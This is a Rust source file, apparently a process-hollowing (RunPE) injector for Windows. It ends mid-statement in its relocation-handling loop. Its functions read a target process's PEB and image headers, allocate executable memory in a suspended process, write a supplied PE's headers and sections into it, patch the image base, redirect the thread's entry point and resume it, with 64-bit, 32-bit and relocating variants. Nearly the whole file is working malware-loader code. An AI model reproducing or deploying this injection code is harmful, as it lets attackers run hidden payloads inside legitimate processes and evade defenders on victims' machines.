use std::env;
use std::ffi::CString;
use std::fs::{self, File};
use std::io::{self, Read};
use std::mem;
use std::ptr;
use winapi::um::winnt::PAGE_READWRITE;
use winapi::um::processthreadsapi::GetExitCodeProcess;
use winapi::um::minwinbase::STILL_ACTIVE;
use winapi::shared::minwindef::{BOOL, DWORD, FARPROC, HMODULE, LPVOID, PBYTE, PULONG, ULONG};
use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER, NTSTATUS, PVOID};
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA, GetModuleHandleA};
use winapi::um::memoryapi::{ReadProcessMemory, VirtualAlloc, VirtualFree, VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{
    HANDLE as WINNT_HANDLE, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use winapi::shared::basetsd::SIZE_T;
use winapi::um::winnt::WOW64_FLOATING_SAVE_AREA;
use winapi::um::winnt::PAGE_EXECUTE_READ;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualQueryEx;
use winapi::um::winnt::{MEMORY_BASIC_INFORMATION};
use winapi::um::processthreadsapi::{GetThreadContext, SetThreadContext, ResumeThread,TerminateProcess};
use winapi::um::winnt::CONTEXT;
use winapi::um::winnt::CONTEXT_INTEGER;
use winapi::um::winnt::BOOLEAN;
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::CONTEXT_FULL;
use winapi::um::winbase::Wow64GetThreadContext;
use winapi::um::winnt::WOW64_CONTEXT;
use winapi::um::winbase::Wow64SetThreadContext;
use winapi::um::memoryapi::VirtualProtectEx;
use winapi::um::winnt::CONTEXT_SEGMENTS;
use winapi::um::synchapi::WaitForSingleObject;
const BUFFER_SIZE: usize = 4096;

#[repr(C)]
struct THREAD_BASIC_INFORMATION {
    ExitStatus: i32,
    TebBaseAddress: PVOID,
    ClientId: CLIENT_ID,
    AffinityMask: usize,
    Priority: i32,
    BasePriority: i32,
}

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: HANDLE,
    UniqueThread: HANDLE,
}

extern "system" {
    fn NtQueryInformationThread(
        ThreadHandle: HANDLE,
        ThreadInformationClass: u32,
        ThreadInformation: PVOID,
        ThreadInformationLength: u32,
        ReturnLength: *mut u32
    ) -> i32;
}

type NtUnmapViewOfSection = unsafe extern "system" fn(
    process_handle: HANDLE,
    base_address: PVOID,
) -> NTSTATUS;

#[repr(C)]
struct PebLdrData {
    Length: ULONG,
    Initialized: BOOLEAN,
    SsHandle: PVOID,
    InLoadOrderModuleList: PVOID,
    InMemoryOrderModuleList: PVOID,
    InInitializationOrderModuleList: PVOID,
}

#[repr(C)]
struct ProcessAddressInformation {
    peb_address: PVOID,
    image_base_address: PVOID,
}

const IMAGE_NT_OPTIONAL_HDR64_MAGIC: u16 = 0x20B;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;

fn get_pe_magic(buffer: *const u8) -> io::Result<u16> {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders64;
        println!("dos_header: {:p}", dos_header);
        println!("nt_headers: {:p}", nt_headers);
        println!("buffer: {:p}", buffer);
        Ok((*nt_headers).optional_header.magic)
    }
}

fn read_remote_pe_magic(process_handle: HANDLE, base_address: PVOID) -> io::Result<u16> {
    let mut buffer = vec![0u8; BUFFER_SIZE];
    
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            base_address,
            buffer.as_mut_ptr() as PVOID,
            BUFFER_SIZE,
            ptr::null_mut(),
        )
    };

    if success == 0 {
        return Err(io::Error::last_os_error());
    }

    get_pe_magic(buffer.as_ptr())
}

#[repr(C)]
pub struct CUST_WOW64_CONTEXT {
    pub context_flags: u32,
    pub dr0: u32,
    pub dr1: u32,
    pub dr2: u32,
    pub dr3: u32,
    pub dr6: u32,
    pub dr7: u32,
    pub float_save: CUST_WOW64_FLOATING_SAVE_AREA,
    pub seg_gs: u32,
    pub seg_fs: u32,
    pub seg_es: u32,
    pub seg_ds: u32,
    pub edi: u32,
    pub esi: u32,
    pub ebx: u32,
    pub edx: u32,
    pub ecx: u32,
    pub eax: u32,
    pub ebp: u32,
    pub eip: u32,
    pub seg_cs: u32,
    pub eflags: u32,
    pub esp: u32,
    pub seg_ss: u32,
    pub extended_registers: [u8; CUST_WOW64_MAXIMUM_SUPPORTED_EXTENSION],
}

impl Default for CUST_WOW64_CONTEXT {
    fn default() -> Self {
        Self {
            context_flags: 0,
            dr0: 0,
            dr1: 0,
            dr2: 0,
            dr3: 0,
            dr6: 0,
            dr7: 0,
            float_save: CUST_WOW64_FLOATING_SAVE_AREA::default(),
            seg_gs: 0,
            seg_fs: 0,
            seg_es: 0,
            seg_ds: 0,
            edi: 0,
            esi: 0,
            ebx: 0,
            edx: 0,
            ecx: 0,
            eax: 0,
            ebp: 0,
            eip: 0,
            seg_cs: 0,
            eflags: 0,
            esp: 0,
            seg_ss: 0,
            extended_registers: [0; CUST_WOW64_MAXIMUM_SUPPORTED_EXTENSION],
        }
    }
}

#[repr(C)]
pub struct CUST_WOW64_FLOATING_SAVE_AREA {
    pub control_word: u32,
    pub status_word: u32,
    pub tag_word: u32,
    pub error_offset: u32,
    pub error_selector: u32,
    pub data_offset: u32,
    pub data_selector: u32,
    pub register_area: [u8; CUST_WOW64_SIZE_OF_80387_REGISTERS],
    pub cr0_npx_state: u32,
}

impl Default for CUST_WOW64_FLOATING_SAVE_AREA {
    fn default() -> Self {
        Self {
            control_word: 0,
            status_word: 0,
            tag_word: 0,
            error_offset: 0,
            error_selector: 0,
            data_offset: 0,
            data_selector: 0,
            register_area: [0; CUST_WOW64_SIZE_OF_80387_REGISTERS],
            cr0_npx_state: 0,
        }
    }
}

// pub type PWOW64_CONTEXT = *mut WOW64_CONTEXT;

pub const CUST_CONTEXT_AMD64: u32 = 0x00100000;
pub const CUST_CONTEXT_CONTROL: u32 = CUST_CONTEXT_AMD64 | 0x00000001;
pub const CUST_CONTEXT_INTEGER: u32 = CUST_CONTEXT_AMD64 | 0x00000002;
pub const CUST_CONTEXT_FLOATING_POINT: u32 = CUST_CONTEXT_AMD64 | 0x00000008;
pub const CUST_CONTEXT_DEBUG_REGISTERS: u32 = CUST_CONTEXT_AMD64 | 0x00000010;
pub const CUST_CONTEXT_SEGMENTS: u32 = CUST_CONTEXT_AMD64 | 0x0000004;

pub const CUST_CONTEXT_FULL: u32 = CUST_CONTEXT_CONTROL | CUST_CONTEXT_INTEGER | CUST_CONTEXT_FLOATING_POINT;

pub const CONTEXT_ALL: u32 = CUST_CONTEXT_CONTROL | CUST_CONTEXT_INTEGER | CUST_CONTEXT_SEGMENTS | 
    CUST_CONTEXT_FLOATING_POINT | CUST_CONTEXT_DEBUG_REGISTERS;

pub const CUST_WOW64_SIZE_OF_80387_REGISTERS: usize = 80;
pub const CUST_WOW64_MAXIMUM_SUPPORTED_EXTENSION: usize = 512;


// pub type PWOW64_FLOATING_SAVE_AREA = *mut WOW64_FLOATING_SAVE_AREA;

#[repr(C)]
struct RtlUserProcessParameters {
    MaximumLength: ULONG,
    Length: ULONG,
    Flags: ULONG,
    DebugFlags: ULONG,
    ConsoleHandle: PVOID,
    ConsoleFlags: ULONG,
    StandardInput: PVOID,
    StandardOutput: PVOID,
    StandardError: PVOID,
    CurrentDirectory: PVOID,
    CurrentDirectoryHandle: PVOID,
    DllPath: PVOID,
    ImagePathName: PVOID,
    CommandLine: PVOID,
    Environment: PVOID,
    StartingX: ULONG,
    StartingY: ULONG,
    Width: ULONG,
    Height: ULONG,
    CharWidth: ULONG,
    CharHeight: ULONG,
    ConsoleTextAttributes: ULONG,
    WindowFlags: ULONG,
    ShowWindowFlags: ULONG,
    WindowTitle: PVOID,
    DesktopName: PVOID,
    ShellInfo: PVOID,
    RuntimeData: PVOID,
    CurrentDirectories: [PVOID; 32],
}

#[repr(C)]
struct ImageOptionalHeader32 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    base_of_data: u32,
    image_base: u32,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u32,
    size_of_stack_commit: u32,
    size_of_heap_reserve: u32,
    size_of_heap_commit: u32,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders32 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader32,
}

#[repr(C)]
struct PebLockRoutine {
    PebLockRoutine: PVOID,
}

#[repr(C)]
struct PebFreeBlock {
    _PEB_FREE_BLOCK: [u8; 8],
    Size: ULONG,
}

#[repr(C)]
#[derive(Debug)]
struct ProcessBasicInformation {
    reserved1: PVOID,
    peb_base_address: PVOID,
    reserved2: [PVOID; 2],
    unique_process_id: ULONG,
    reserved3: PVOID,
}

#[repr(C)]
struct PEB {
    inherited_address_space: BOOLEAN,
    read_image_file_exec_options: BOOLEAN,
    being_debugged: BOOLEAN,
    spare: BOOLEAN,
    mutant: HANDLE,
    image_base_address: PVOID,
    loader_data: *mut PebLdrData,
    process_parameters: *mut RtlUserProcessParameters,
    subsystem_data: PVOID,
    process_heap: PVOID,
    fast_peb_lock: PVOID,
    fast_peb_lock_routine: *mut PebLockRoutine,
    fast_peb_unlock_routine: *mut PebLockRoutine,
    environment_update_count: ULONG,
    kernel_callback_table: *mut PVOID,
    event_log_section: PVOID,
    event_log: PVOID,
    free_list: *mut PebFreeBlock,
    tls_expansion_counter: ULONG,
    tls_bitmap: PVOID,
    tls_bitmap_bits: [ULONG; 2],
    read_only_shared_memory_base: PVOID,
    read_only_shared_memory_heap: PVOID,
    read_only_static_server_data: *mut *mut PVOID,
    ansi_code_page_data: PVOID,
    oem_code_page_data: PVOID,
    unicode_case_table_data: PVOID,
    number_of_processors: ULONG,
    nt_global_flag: ULONG,
    spare2: [u8; 4],
    critical_section_timeout: LARGE_INTEGER,
    heap_segment_reserve: ULONG,
    heap_segment_commit: ULONG,
    heap_decommit_total_free_threshold: ULONG,
    heap_decommit_free_block_threshold: ULONG,
    number_of_heaps: ULONG,
    maximum_number_of_heaps: ULONG,
    process_heaps: *mut *mut PVOID,
    gdi_shared_handle_table: PVOID,
    process_starter_helper: PVOID,
    gdi_dc_attribute_list: PVOID,
    loader_lock: PVOID,
    os_major_version: ULONG,
    os_minor_version: ULONG,
    os_build_number: ULONG,
    os_platform_id: ULONG,
    image_subsystem: ULONG,
    image_subsystem_major_version: ULONG,
    image_subsystem_minor_version: ULONG,
    gdi_handle_buffer: [ULONG; 0x22],
    post_process_init_routine: ULONG,
    tls_expansion_bitmap: ULONG,
    tls_expansion_bitmap_bits: [u8; 0x80],
    session_id: ULONG,
}

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}


#[repr(C)]
struct LoadedImage {
    file_header: *mut ImageNtHeaders64,
    number_of_sections: u16,
    sections: *mut ImageSectionHeader,
}

#[repr(C)]
struct BaseRelocationBlock {
    page_address: u32,
    block_size: u32,
}

#[repr(C)]
struct BaseRelocationEntry {
    data: u16  // Will use bit operations to access offset (12 bits) and type (4 bits)
}

impl BaseRelocationEntry {
    fn offset(&self) -> u16 {
        self.data & 0x0FFF  // Get lower 12 bits
    }

    fn type_(&self) -> u16 {
        (self.data >> 12) & 0xF  // Get upper 4 bits
    }
}


#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}


type NtQueryInformationProcess = unsafe extern "system" fn(
    process_handle: HANDLE,
    process_information_class: DWORD,
    process_information: PVOID,
    process_information_length: ULONG,
    return_length: *mut ULONG,
) -> NTSTATUS;

fn initialize_nt_query_information_process() -> Option<NtQueryInformationProcess> {
    unsafe {
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            return None;
        }

        let proc_addr = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr() as *const i8);
        if proc_addr.is_null() {
            return None;
        }

        Some(std::mem::transmute(proc_addr))
    }
}

fn find_remote_peb(process_handle: HANDLE) -> PVOID {
    let nt_query = match initialize_nt_query_information_process() {
        Some(func) => func,
        None => return ptr::null_mut(),
    };

    let mut basic_info = ProcessBasicInformation {
        reserved1: ptr::null_mut(),
        peb_base_address: ptr::null_mut(),
        reserved2: [ptr::null_mut(); 2],
        unique_process_id: 0,
        reserved3: ptr::null_mut(),
    };
    let mut return_length = 0;

    unsafe {
        let status = nt_query(
            process_handle,
            0,
            &mut basic_info as *mut _ as PVOID,
            mem::size_of::<ProcessBasicInformation>() as ULONG,
            &mut return_length,
        );

        if status >= 0 {
            basic_info.peb_base_address
        } else {
            ptr::null_mut()
        }
    }
}

fn read_remote_peb(process_handle: HANDLE) -> Option<Box<PEB>> {
    let peb_address = find_remote_peb(process_handle);
    if peb_address.is_null() {
        return None;
    }

    let mut peb = Box::new(unsafe { mem::zeroed::<PEB>() });
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            peb_address,
            &mut *peb as *mut PEB as PVOID,
            mem::size_of::<PEB>(),
            ptr::null_mut(),
        )
    };

    if success == 0 {
        None
    } else {
        Some(peb)
    }
}

fn read_remote_image(process_handle: HANDLE, image_base_address: PVOID) -> Option<Box<LoadedImage>> {
    let mut buffer = vec![0u8; BUFFER_SIZE];
    
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            image_base_address,
            buffer.as_mut_ptr() as PVOID,
            BUFFER_SIZE,
            ptr::null_mut(),
        )
    };

    if success == 0 {
        return None;
    }

    unsafe {
        let dos_header = buffer.as_ptr() as *const ImageDosHeader;
        let nt_headers = (buffer.as_ptr() as usize + (*dos_header).e_lfanew as usize) 
            as *mut ImageNtHeaders64;
        
        let image = Box::new(LoadedImage {
            file_header: nt_headers,
            number_of_sections: (*nt_headers).file_header.number_of_sections,
            sections: (buffer.as_ptr() as usize + (*dos_header).e_lfanew as usize + 
                mem::size_of::<ImageNtHeaders64>()) as *mut ImageSectionHeader,
        });

        Some(image)
    }
}

fn read_remote_image32(process_handle: HANDLE, image_base_address: PVOID) -> Option<Box<LoadedImage>> {
    // Read DOS header first
    let mut dos_header: ImageDosHeader = unsafe { mem::zeroed() };
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            image_base_address,
            &mut dos_header as *mut _ as PVOID,
            mem::size_of::<ImageDosHeader>(),
            ptr::null_mut(),
        )
    };

    if success == 0 {
        return None;
    }

    // Read NT Headers
    let mut nt_headers32: ImageNtHeaders32 = unsafe { mem::zeroed() };
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            (image_base_address as usize + dos_header.e_lfanew as usize) as PVOID,
            &mut nt_headers32 as *mut _ as PVOID,
            mem::size_of::<ImageNtHeaders32>(),
            ptr::null_mut(),
        )
    };

    if success == 0 {
        return None;
    }

    Some(Box::new(LoadedImage {
        file_header: &nt_headers32 as *const _ as *mut ImageNtHeaders64,
        number_of_sections: nt_headers32.file_header.number_of_sections,
        sections: ((image_base_address as usize + dos_header.e_lfanew as usize + 
            mem::size_of::<ImageNtHeaders32>()) as *mut ImageSectionHeader),
    }))
}

fn get_process_address_information32(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION) 
    -> Option<ProcessAddressInformation> {
    unsafe {
        let mut ctx: WOW64_CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL;
        
        if Wow64GetThreadContext(process_info.hThread, &mut ctx) == 0 {
            return None;
        }

        let mut image_base: PVOID = ptr::null_mut();
        if ReadProcessMemory(
            process_info.hProcess,
            (ctx.Ebx + 0x8) as PVOID,
            &mut image_base as *mut PVOID as PVOID,
            std::mem::size_of::<DWORD>(),
            ptr::null_mut()
        ) == 0 {
            return None;
        }

        Some(ProcessAddressInformation {
            peb_address: ctx.Ebx as PVOID,
            image_base_address: image_base,
        })
    }
}


fn get_nt_headers(image_base: PVOID) -> *mut ImageNtHeaders64 {
    unsafe {
        let dos_header = image_base as *const ImageDosHeader;
        (image_base as usize + (*dos_header).e_lfanew as usize) as *mut ImageNtHeaders64
    }
}

fn get_loaded_image(image_base: PVOID) -> Box<LoadedImage> {
    unsafe {
        let dos_header = image_base as *const ImageDosHeader;
        let nt_headers = get_nt_headers(image_base);
        
        Box::new(LoadedImage {
            file_header: nt_headers,
            number_of_sections: (*nt_headers).file_header.number_of_sections,
            sections: (image_base as usize + (*dos_header).e_lfanew as usize + 
                mem::size_of::<ImageNtHeaders64>()) as *mut ImageSectionHeader,
        })
    }
}

fn get_nt_unmap_view_of_section() -> Option<NtUnmapViewOfSection> {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            println!("Failed to get ntdll handle");
            return None;
        }

        let proc_addr = GetProcAddress(ntdll, b"NtUnmapViewOfSection\0".as_ptr() as *const i8);
        if proc_addr.is_null() {
            println!("Failed to get NtUnmapViewOfSection address");
            return None;
        }

        Some(std::mem::transmute(proc_addr))
    }
}

fn count_relocation_entries(block_size: u32) -> u32 {
    (block_size as u32 - mem::size_of::<BaseRelocationBlock>() as u32) / 
        mem::size_of::<BaseRelocationEntry>() as u32
}

fn has_relocation64(buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders64;
        println!("Relocation table address: 0x{:X}", (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address);
        (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address != 0
    }
}

fn run_pe64(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION, 
    buffer: *const u8) -> bool {
unsafe {
let dos_header = buffer as *const ImageDosHeader;
let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
    as *const ImageNtHeaders64;

// Allocate memory in target process
let alloc_address = VirtualAllocEx(
    process_info.hProcess,
    (*nt_headers).optional_header.image_base as PVOID,
    (*nt_headers).optional_header.size_of_image as usize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

if alloc_address.is_null() {
    println!("[-] An error occurred when trying to allocate memory for the new image.");
    unsafe { VirtualFree(buffer as *mut winapi::ctypes::c_void, 0, MEM_RELEASE); }
    return false;
}
println!("[+] Memory allocated at: {:p}", alloc_address);

// Write PE headers
let write_headers = WriteProcessMemory(
    process_info.hProcess,
    alloc_address,
    buffer as PVOID,
    (*nt_headers).optional_header.size_of_headers as usize,
    ptr::null_mut()
);

if write_headers == 0 {
    println!("[-] An error occurred when trying to write the headers of the new image.");
    unsafe {
        TerminateProcess(process_info.hProcess, 1);
        VirtualFree(buffer as *mut winapi::ctypes::c_void, 0, MEM_RELEASE);
    }
    return false;
}
println!("[+] Headers written at: {:p}", (*nt_headers).optional_header.image_base as *const u8);

// Write sections
for i in 0..(*nt_headers).file_header.number_of_sections {
    let section_header = (nt_headers as usize + 
    std::mem::size_of::<u32>() +  // Skip NT signature
    std::mem::size_of::<ImageFileHeader>() + 
    (*nt_headers).file_header.size_of_optional_header as usize + 
    (i as usize * std::mem::size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

    let write_section = WriteProcessMemory(
        process_info.hProcess,
        (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
        (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
        (*section_header).size_of_raw_data as usize,
        ptr::null_mut()
    );

    if write_section == 0 {
        println!("[-] An error occurred when trying to write section: {}",
            String::from_utf8_lossy(&(*section_header).name));
        return false;
    }
    println!("[+] Section {} written at: {:p}",
        String::from_utf8_lossy(&(*section_header).name),
        (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);
}

// Get and modify thread context
let mut context: CONTEXT = std::mem::zeroed();
context.ContextFlags = CONTEXT_FULL;

if GetThreadContext(process_info.hThread, &mut context) == 0 {
    println!("[-] An error occurred when trying to get the thread context.");
    return false;
}

// Write image base to PEB
let image_base = (*nt_headers).optional_header.image_base;
if WriteProcessMemory(
    process_info.hProcess,
    (context.Rdx + 0x10) as PVOID,
    &image_base as *const u64 as PVOID,
    std::mem::size_of::<u64>(),
    ptr::null_mut()
) == 0 {
    println!("[-] An error occurred when trying to write the image base in the PEB.");
    return false;
}

// Set new entry point
context.Rcx = alloc_address as u64 + (*nt_headers).optional_header.address_of_entry_point as u64;

if SetThreadContext(process_info.hThread, &context) == 0 {
    println!("[-] An error occurred when trying to set the thread context.");
    return false;
}

ResumeThread(process_info.hThread);
true
}
}

fn get_reloc_address64(buffer: *const u8) -> ImageDataDirectory {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *const ImageNtHeaders64;
        
        if (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address != 0 {
            return (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        }
        
        ImageDataDirectory {
            virtual_address: 0,
            size: 0,
        }
    }
}

fn run_pe32(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION, 
    buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *const ImageNtHeaders32;

        // Allocate memory in target process
        let alloc_address = VirtualAllocEx(
            process_info.hProcess,
            (*nt_headers).optional_header.image_base as PVOID,
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if alloc_address.is_null() {
            println!("[-] An error occurred when trying to allocate memory for the new image.");
            return false;
        }
        println!("[+] Memory allocated at: {:p}", alloc_address);

        // Write PE headers
        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_headers as usize,
            ptr::null_mut()
        );

        if write_headers == 0 {
            println!("[-] An error occurred when trying to write the headers of the new image.");
            return false;
        }
        println!("[+] Headers written at: {:p}", (*nt_headers).optional_header.image_base as *const u8);

        // Write sections
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize + 
                std::mem::size_of::<u32>() +  // Skip NT signature
                std::mem::size_of::<ImageFileHeader>() + 
                (*nt_headers).file_header.size_of_optional_header as usize + 
                (i as usize * std::mem::size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                ptr::null_mut()
            );

            if write_section == 0 {
                println!("[-] An error occurred when trying to write section: {}",
                    String::from_utf8_lossy(&(*section_header).name));
                return false;
            }
            println!("[+] Section {} written at: {:p}",
                String::from_utf8_lossy(&(*section_header).name),
                (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);
        }

        // Get and modify thread context
        let mut context: WOW64_CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL;

        if Wow64GetThreadContext(process_info.hThread, &mut context) == 0 {
            println!("[-] An error occurred when trying to get the thread context.");
            return false;
        }

        // Write image base to PEB
        let image_base = (*nt_headers).optional_header.image_base;
        if WriteProcessMemory(
            process_info.hProcess,
            (context.Ebx + 0x8) as PVOID,
            &image_base as *const u32 as PVOID,
            std::mem::size_of::<u32>(),
            ptr::null_mut()
        ) == 0 {
            println!("[-] An error occurred when trying to write the image base in the PEB.");
            return false;
        }

        // Set new entry point
        context.Eax = alloc_address as u32 + (*nt_headers).optional_header.address_of_entry_point;

        if winapi::um::winbase::Wow64SetThreadContext(process_info.hThread, &context) == 0 {
            println!("[-] An error occurred when trying to set the thread context.");
            return false;
        }

        ResumeThread(process_info.hThread);
        true
    }
}

fn run_pe_reloc64(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION, 
    buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *mut ImageNtHeaders64;

        let alloc_address = VirtualAllocEx(
            process_info.hProcess,
            ptr::null_mut(),
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if alloc_address.is_null() {
            println!("[-] An error occurred when trying to allocate memory for the new image.");
            return false;
        }
        println!("[+] Memory allocated at: {:p}", alloc_address);

        let delta = alloc_address as u64 - (*nt_headers).optional_header.image_base;
        // println!("[+] Delta: 0x{:X}", delta);
        (*nt_headers).optional_header.image_base = alloc_address as u64;

        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_headers as usize,
            ptr::null_mut()
        );

        if write_headers == 0 {
            println!("[-] An error occurred when trying to write the headers of the new image.");
            return false;
        }
        println!("[+] Headers written at: {:p}", alloc_address);

        // Get relocation directory info
        let image_data_reloc = get_reloc_address64(buffer);
        let mut reloc_section = ptr::null_mut();

        // Write sections and find relocation section
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize + 
                std::mem::size_of::<u32>() +  // Skip NT signature
                std::mem::size_of::<ImageFileHeader>() + 
                (*nt_headers).file_header.size_of_optional_header as usize + 
                (i as usize * std::mem::size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            // Check if this is the relocation section
            if image_data_reloc.virtual_address >= (*section_header).virtual_address &&
               image_data_reloc.virtual_address < ((*section_header).virtual_address + (*section_header).virtual_size) {
                reloc_section = section_header as *mut ImageSectionHeader;
            }

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                ptr::null_mut()
            );

            if write_section == 0 {
                println!("[-] An error occurred when trying to write section: {}",
                    String::from_utf8_lossy(&(*section_header).name));
                return false;
            }
            println!("[+] Section {} written at: {:p}",
                String::from_utf8_lossy(&(*section_header).name),
                (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);
        }

        if reloc_section.is_null() {
            println!("[-] Failed to find relocation section.");
            return false;
        }

        println!("[+] Relocation section found: {}", 
            String::from_utf8_lossy(&(*reloc_section).name));

        // Process relocations
        let mut reloc_offset = 0u32;
        while reloc_offset < image_data_reloc.size {
            let base_relocation = (buffer as usize + 
                (*reloc_section).pointer_to_raw_data as usize + 
                reloc_offset as usize) as *const BaseRelocationBlock;
            
            reloc_offset += std::mem::size_of::<BaseRelocationBlock>() as u32;
            
            let entries = count_relocation_entries((*base_relocation).block_size);
            if (*base_relocation).block_size < mem::size_of::<BaseRelocationBlock>() as u32 {
                return false;
            }
            for _ in 0..entries {
                let entry = (buffer as usize + 
                    (*reloc_section).pointer_to_raw_data as usize + 
                    reloc_offset as usize) as *const BaseRelocationEntry;
                
                reloc_offset += std::mem::size_of::<BaseRelocationEntry>() as u32;
                
                if (*entry).type_() == 0 {
                    continue;
                }
            
                let address_location = alloc_address as u64 + 
                    (*base_relocation).page_address as u64 + 
